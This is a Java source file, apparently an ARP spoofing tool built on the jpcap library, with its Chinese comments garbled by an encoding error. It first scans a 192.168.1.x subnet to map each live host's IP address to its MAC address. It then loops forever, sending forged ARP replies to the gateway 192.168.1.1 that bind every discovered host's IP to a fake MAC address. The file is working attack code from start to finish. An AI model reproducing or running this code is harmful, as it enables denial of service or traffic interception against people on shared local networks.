package ArpAttack;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import jpcap.JpcapCaptor;
import jpcap.JpcapSender;  
import jpcap.NetworkInterface;  
import jpcap.packet.ARPPacket;  
import jpcap.packet.EthernetPacket;  

public class ArpImplenment {
	/*
	 * ����IP-Mac��
	 */
    private static HashMap<String, String> map = new HashMap<String, String>();
	
    /*
     * ����MAC��ַbyte����
     */
	public static byte[] stomac(String s) {  
        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };  
        String[] s1 = s.split("-");  
        for (int x = 0; x < s1.length; x++) {  
            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);  
        }  
        return mac;  
    }  
	
	/*
	 * ����ARP����
	 */
    public static void SendArp(HashMap<String, String> map) throws Exception {  
	    /*
	     * ö�����������豸  
	     * ��鱾����ǰʹ�õ��ĸ�����  ���ߵı������ӻ���������������
	     * ���ô���ᵼ��ARP���󲻻ᷢ��ȥ ����ⲻ���쳣
	     */
    	NetworkInterface[] devices = JpcapCaptor.getDeviceList();  
	    NetworkInterface device = devices[2];  
	    JpcapSender sender = JpcapSender.openDevice(device);  
    	while(true){
    	for(Map.Entry<String, String> entry : map.entrySet())
		{
    		String ip = entry.getKey();

    		/*
    		 * JAVA�ַ����ıȽ�  ==�Ƚϵ��������ַ��������� �漰��class�ļ��Ķ��������ƺ��������
    		 * equal�ıȽϲ��ǱȽ�����
    		 *  ��˱Ƚ��������Ӧ����equal������==
    		 */
    		if(ip.equals("192.168.1.1"))
    		{
    			continue;
    		}
    		
    		//// �۸ı���������MAC��ַ α���MAC��ַ������·��ARP��¼���е�MAC��ַ�����򲻻����������Ӱ��
    		InetAddress srcip = InetAddress.getByName(ip);
 		    byte[] srcmac = stomac("C8-E7-D8-CC-2B-CC"); 
 		    
 		    //// ��·��������ƭ 
		    InetAddress desip = InetAddress.getByName("192.168.1.1");
		    byte[] desmac = stomac("8C-F2-28-38-07-7A");
		   
		    // ����ARP��  
		    ARPPacket arp = new ARPPacket();  
		    arp.hardtype = ARPPacket.HARDTYPE_ETHER;  
		    arp.prototype = ARPPacket.PROTOTYPE_IP;  
		    
		    //// ARPPacket.ARP_REPLY���ڽ���MAC��ַ
		    arp.operation = ARPPacket.ARP_REPLY;  
		    arp.hlen = 6;  
		    arp.plen = 4;  
		    arp.sender_hardaddr = srcmac;  
		    arp.sender_protoaddr = srcip.getAddress();  
		    arp.target_hardaddr = desmac;  
		    arp.target_protoaddr = desip.getAddress();
		    
		    //// ����DLC֡  
		    EthernetPacket ether = new EthernetPacket();  
		    ether.frametype = EthernetPacket.ETHERTYPE_ARP;  
		    ether.src_mac = srcmac;  
		    ether.dst_mac = desmac;  
		    arp.datalink = ether;  
		    System.out.println("IP: " + ip + "sending arp..");  
		    sender.sendPacket(arp);  
			}
    	}
    }
    
    /*
     * ����ARP����
     */
    private ARPPacket constractRequestArp(NetworkInterface device, String IP) throws UnknownHostException {
    	//// ����0��ӦIPV6��ַ  ����1��ӦIPV4��ַ
    	byte[] broadcast = stomac("ff-ff-ff-ff-ff-ff");
       	InetAddress srcip = device.addresses[1].address;
       	
       	//// ������Ҫ���䷢��ARP���������IP
       	InetAddress desip = InetAddress.getByName(IP);  
       	ARPPacket arpPacket = new ARPPacket();
       	arpPacket.hardtype=ARPPacket.HARDTYPE_ETHER;
       	arpPacket.prototype=ARPPacket.PROTOTYPE_IP;
       	
        //// ARP_REQUEST��������Ŀ��������MAC��ַ 
       	arpPacket.operation=ARPPacket.ARP_REQUEST;
       	arpPacket.hlen=6;
       	arpPacket.plen=4;
       	arpPacket.sender_hardaddr=device.mac_address;
       	arpPacket.sender_protoaddr=srcip.getAddress();
       	arpPacket.target_hardaddr=broadcast;
       	arpPacket.target_protoaddr=desip.getAddress();

       	EthernetPacket ether=new EthernetPacket();
        ether.frametype=EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac=device.mac_address;
        ether.dst_mac=broadcast;
        arpPacket.datalink=ether;
        return arpPacket;
	}
    
    /*
     * ɨ�����д��������IP-Mac��ַ��
     */
    public HashMap<String, String> GetAllMacAddress() throws Exception
    {
    	 /*
	     * ö�����������豸  
	     * ��鱾����ǰʹ�õ��ĸ�����  ���ô���ᵼ��ARP���󲻻ᷢ��ȥ ����ⲻ���쳣
	     * ����ʹ�õ���������  ���ڵ��豸����Ϊ2
	     */
    	NetworkInterface[] devices = JpcapCaptor.getDeviceList();
    	NetworkInterface device = devices[2];  
    	
    	//// ��������ӿ�
    	JpcapCaptor captor=JpcapCaptor.openDevice(device,2000,false,3000);
    	captor.setFilter("arp",true);
    	JpcapSender sender=captor.getJpcapSenderInstance();
    	ArrayList<String> list = new ArrayList<>();
    	for(int i = 1; i < 256; i++)
    	{
    		list.add("192.168.1." + i);
    	}
    	
    	Iterator<String> iterator = list.iterator();
    	System.out.println("��ʼɨ�赱ǰ���������д����������������Ԥ����Ҫ2����");
        while(true){
        	if(iterator.hasNext())
        	{
        		ARPPacket arpPacket = constractRequestArp(device, iterator.next());
            	sender.sendPacket(arpPacket);
        	}
        	else
        	{
        		System.out.println("");
        		System.out.println("ARPɨ����ɣ�5���ʼARP����");
        		Thread.sleep(5000);
        		return map;
        	}
        	
        	//// �������в��񵽵����ݰ�
        	ARPPacket p=(ARPPacket)captor.getPacket();
        	if(p == null)
        	{
        		System.out.println("δ��ȡ������ARP��Ϣ");
        	}
        	else
        	{
        		/*
        		 * ����ARPЭ��Ķ��壬����Ŀ��������MAC��ַ����Ҫ�򱾾������ڵ����������㲥ARP����
        		 * ��Ŀ������������������
        		 * ����������ͷ�����Ļ�Ӧ�Լ���MAC��ַ
        		 * ������ֻ��Ҫ��ȡ��Ӧ��Ϣ
        		 */
        		if(p.operation != ARPPacket.ARP_REPLY)
        		{
        			continue;
        		}
        		
        		//// �ж���Ӧ��Ϣ�Ƿ��Ƿ����ҵ�
        		boolean isTargetIP = false;
        		if(p.target_protoaddr[0] == device.addresses[1].address.getAddress()[0]
        		 &&p.target_protoaddr[1] == device.addresses[1].address.getAddress()[1]
				 &&p.target_protoaddr[2] == device.addresses[1].address.getAddress()[2]
				 &&p.target_protoaddr[3] == device.addresses[1].address.getAddress()[3])
        		{
        			isTargetIP = true;
        		}
        		
        		if(!isTargetIP)
        		{
        			System.out.println("����Ӧ����ARP");
    				continue;
        		}
        		
        		//// ��byte[]�������Ϊ��־IP��ַ
        		StringBuilder str = new StringBuilder();
				for(byte part : p.sender_protoaddr)
				{
					String hex = (part&0xff) < 0 ? String.valueOf(part&0xff + 256) : String.valueOf(part&0xff);
					str.append(hex);
        			str.append('.');
				}
				
				String ip = str.toString().substring(0, str.length() - 1);
				
				/*
				 * �ж�Ŀ�������Ƿ���
				 * ����������᷵��MAC��ַΪ00-00-00-00-00-00
				 * 1.Ŀ��IP�ϲ����ڴ������
				 * 2.Ŀ������������̬��  ���ھ�̬�󶨵��������޷���·�����۸���MAC��ַ��
				 */
    			boolean isAlive = false;
    			byte[] deadMac = stomac("00-00-00-00-00-00");
    			if(!(p.target_hardaddr[0] == deadMac[0]
					&&p.target_hardaddr[1] == deadMac[1]
					&&p.target_hardaddr[2] == deadMac[2]
					&&p.target_hardaddr[3] == deadMac[3]
					&&p.target_hardaddr[4] == deadMac[4]
					&&p.target_hardaddr[5] == deadMac[5]))
    			{
    				isAlive = true;
    			}
    			
    			System.out.println("��Ӧ����IP: " + ip);
    			if(!isAlive)
    			{
    				System.out.println("Ŀ������δ���");
    				continue;
    			}
				
    			//// ������õ�Ŀ������IP-MAC��
				if(!map.containsKey(ip))
				{
    			    str = new StringBuilder();
    			    
    			    //// ����ARP��Ӧ��MAC��ַ
    				for(byte part : p.sender_hardaddr)
    				{
    					String hex = Integer.toHexString(part&0xff).toUpperCase();
            			str.append(hex.length() == 1 ? "0" + hex : hex);
            			str.append('-');
    				}
    				
    				String mac = str.toString().substring(0, 17);
    			    System.out.println("��ǰɨ��������MAC��ַ��" + mac);
    			    Thread.sleep(3000);
    				map.put(ip, mac);
				}
				else
				{
					System.out.println("��ǰɨ��IP��¼�Ѵ��ڣ�������һ��");
					continue;
				}
				
        		for(Map.Entry<String, String> entry : map.entrySet())
        		{
        			System.out.println("IP-> " + entry.getKey() + "," + "   " + "MAC-> " + entry.getValue());
        		}
        		
        		System.out.println("���ֽ�������ǰmap����������:" + map.size());
        		System.out.println("");
        		Thread.sleep(4000);
        	}
        }
    }
}
